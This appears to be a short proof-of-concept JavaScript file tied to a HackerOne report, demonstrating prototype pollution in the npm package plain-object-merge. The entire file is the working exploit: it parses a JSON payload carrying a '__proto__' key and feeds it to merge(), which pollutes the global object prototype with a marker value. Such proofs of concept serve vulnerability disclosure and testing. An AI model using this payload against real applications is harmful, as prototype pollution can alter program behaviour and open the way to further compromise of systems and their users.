//https://hackerone.com/reports/871156
 
  const merge = require("plain-object-merge");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');

  obj = {};

   

  merge([{}, payload]);
// End of file
